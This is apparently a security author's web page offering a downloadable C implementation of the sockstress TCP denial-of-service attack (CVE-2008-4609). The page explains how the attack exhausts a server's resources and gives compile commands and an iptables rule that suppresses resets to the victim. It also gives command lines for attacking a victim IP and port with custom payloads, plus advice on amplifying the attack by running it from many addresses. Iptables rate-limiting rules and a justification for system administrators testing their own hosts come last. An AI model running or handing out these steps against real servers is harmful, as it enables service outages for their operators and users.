<h1>Sockstress Tools &amp; Source Code</h1>

<p>
    Sockstress is a Denial of Service attack on TCP services discovered in
    2008 by Jack C. Louis from <a href="http://www.outpost24.com/">Outpost24</a>. It works by using raw sockets
    to establish many TCP connections to a listening service. Because the 
    connections are established using raw sockets, connections are established
    without having to save any per-connection state on the attacker's machine.
</p>
<p>    
    Like SYN flooding, sockstress is an asymmetric resource consumption attack:
    It requires very little resources (time, memory, and bandwidth) to run a 
    sockstress attack, but uses a lot of resources on the victim's machine.
    Because of this asymmetry, a weak attacker (e.g. one bot behind a cable 
    modem) can bring down a rather large web server.
</p>
<p>    
    Unlike SYN flooding, sockstress actually completes the connections, and 
    cannot be thwarted using SYN cookies. In the last packet of the three-way 
    handshake a ZERO window size is advertised -- meaning that the client is 
    unable to accept data -- forcing the victim to keep the connection alive
    and periodically probe the client to see if it can accept data yet.
</p>
<p>    
    This implementation of sockstress takes the idea a little further by 
    allowing the user to specify a payload, which will be sent along with the
    last packet of the three-way handshake, so in addition to opening a 
    connection, the attacker can request a webpage, perform a DNS lookup, or anything else that can fit in one packet.
</p>
<p>    
    For more information on sockstress, see <a href="https://secure.wikimedia.org/wikipedia/en/wiki/Sockstress">Sockstress on Wikipedia</a>
    or listen to the <a href="http://media.grc.com/sn/sn-164.mp3">SecurityNow! Sockstress Episode</a>.
</p>

<h2>Download Sockstress</h2>

<p>
    Download our public domain C implementation: <strong><a href="/source/sockstress.tar.gz">sockstress.tar.gz</a> </strong> (8 KB)
    <br />
    Download the original Sockstress C source (by Outpost24): <strong><a href="/source/sockstress-outpost24.tar.gz">sockstress-outpost24.tar.gz</a></strong> (232 KB)
</p>

<p>
    The rest of this page is about our implementation.
</p>

<h3>Compiling</h3>

    <p>Our sockstress code has been tested on Debian Linux, using the GCC compiler.</p>

<div class="code">
    # gcc -Wall -c sockstress.c <br />
    # gcc -pthread -o sockstress sockstress.o <br />
</div>

<h2>How do I use sockstress?</h2>

    <div style="background-color: #FF2222; border: solid black 1px; margin: 10px;">
        <div style="text-align: center; font-weight: bold; border-bottom: solid black 1px;">
            WARNING:
        </div>
        <p style="padding: 10px; margin: 0;">
        The sockstress attack has been known to render operating systems 
        unbootable. NEVER run it on a production system unless all data has been 
        backed up and you are prepared to re-install the OS. Also be aware of 
        any network devices that save connection state (such as a NAT router) between the attack machine and victim machine. They
        may get overloaded too. You have been warned.
        </p>
    </div>

    <p>
    Sockstress uses raw sockets, so you must run the tool as root. You must
    also stop your OS from sending RST packets to the victim in response to
    unrecognized SYN/ACKs sent during the attack. To do so, set an iptables
    rule:
    </p>
<div class="code">
        # iptables -A OUTPUT -p TCP --tcp-flags rst rst -d xx.xx.xx.xx -j DROP
</div>
    <p>Where xx.xx.xx.xx is the victim's IP address.</p>

    <p>To view the sockstress help menu, run:</p>
<div class="code">
        # ./sockstress -h<br />
SOCKSTRESS - CVE-2008-4609 | havoc@defuse.ca<br />
Usage: ./sockstress &lt;ip&gt;:&lt;port&gt; &lt;interface&gt; [-p payload] [-d delay]<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&lt;ip&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Victim IP address<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&lt;port&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Victim port<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&lt;interface&gt; &nbsp; &nbsp; Local network interface (e.g. eth0)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;-p payload &nbsp; &nbsp; &nbsp;File containing data to send after connecting<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Payload can be at most 1000 bytes<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;-d delay &nbsp; &nbsp; &nbsp; &nbsp;Microseconds between SYN packets (default: 10000)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;-h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Help menu<br />
<br />
&nbsp;**You must configure your firewall to drop TCP reset packets sent to &lt;ip&gt;**
</div>

    <p>To execute an attack, sockstress requires three parameters:</p>
    <ol>
        <li>Victim IP</li>
        <li>Victim port</li>
        <li>Network interface to send packets from (e.g. eth0)</li>
    </ol>

    <p>For example, to run an attack on port 80 on 127.0.0.1, run:</p>
<div class="code">
        # ./sockstress 127.0.0.1:80 eth0
</div>
    
    <p>Sockstress also allows the user to control the delay between sent SYN 
    packets. This value is specified in microseconds with the -d option.
    For example, to send a SYN packet every second, run:</p>
<div class="code">
        # ./sockstress 127.0.0.1:80 eth0 -d 1000000
</div>

    <p>You can also have sockstress send some data to the victim after the 
    connection has been established. Do this by specifying a file containing
    the data with the -p option. For example, to make HTTP requests:</p>
<div class="code">
        # ./sockstress 127.0.0.1:80 eth0 -p payloads/http
</div>
    <p>... where payloads/http contains:</p>

<div class="code">
    GET / HTTP/1.0
    <br /><br />
</div>
    
    <p>Example payloads for making DNS requests, requesting web pages, and sending
    mail with SMTP are provided with the source code.</p>

    <p>To run a sockstress attack against multiple ports, you must run multiple
    instances of the tool. The attack can be amplified by assigning many IP
    addresses to a single machine and running an instance of the attack from
    each IP. This improves the attack because sockstress will quickly establish
    a connection from every source port, so more IP addresses are needed to
    open more connections (more sets of source ports).</p>
<h2>How can I prevent sockstress attacks?</h2>

    <p>The only way to completely prevent sockstress attacks is to whitelist
    access to TCP services. This is not practical in most situations, so the
    best that can be done is to rate limit connections with iptables.</p>

    <p>To block an IP after it opens more than 10 connections to port 80 within 
    30 seconds, install the following iptables rules:</p>

    <div class="code">
    # iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set <br />
    # iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP
    </div>

    <p style="text-align: center;"><i>Source: <a href="http://codingfreak.blogspot.ca/2010/01/iptables-rate-limit-incoming.html">
                    http://codingfreak.blogspot.ca/2010/01/iptables-rate-limit-incoming.html</a></i></p>

    <p>Note that sockstress attacks are still possible even with these rules in 
    place. The attacker just needs more IP addresses to mount a successful 
    attack.</p>

    <p>You're probably wondering what it looks like to be under attack by sockstress. 
        The output of <i>netstat -tn</i> will look something like <a href="/downloads/sockstress.txt">this</a>:</p>

    <div class="code">
    <a href="/downloads/sockstress.txt" style="text-decoration: none;">...</a><br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:16022 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:26244 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:6786 &nbsp; &nbsp; &nbsp;ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:1676 &nbsp; &nbsp; &nbsp;ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:9440 &nbsp; &nbsp; &nbsp;ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:22446 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:48356 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:21740 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:30341 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:62594 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:14492 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:31940 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;1 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:39136 &nbsp; &nbsp; FIN_WAIT1 &nbsp;<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:54779 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:59578 &nbsp; &nbsp; ESTABLISHED<br />
tcp6 &nbsp; &nbsp; &nbsp; 0 &nbsp; &nbsp; &nbsp;0 192.168.1.10:80 &nbsp; &nbsp; &nbsp; &nbsp; 192.168.1.102:38544 &nbsp; &nbsp; ESTABLISHED<br />
<a href="/downloads/sockstress.txt" style="text-decoration: none;">...</a>
    </div>

<h2>Is releasing this code ethical?</h2>

    <p>Sockstress code has existed in the wild since (at least) 2011:</p>
    <ul>
        <li><a href="http://h.ackack.net/sockstress.html">Sockstress Perl PoC created in 2011</a></li>
        <li><a href="http://www.2shared.com/file/L4VC9Wdp/sockstresstar.html">Outpost24's Sockstress Source uploaded to 2shared.com in 2011</a> (mirrored <a href="/source/sockstress-outpost24.tar.gz">here</a> convenience)</li>
    </ul>
    
    <p>Sockstress is still effective. However, any packet hacker could
    easily write a sockstress attack tool. For this reason, I feel it is best
    to release my sockstress tool so system administrators can test their
    systems and stronger defences can be developed.</p>

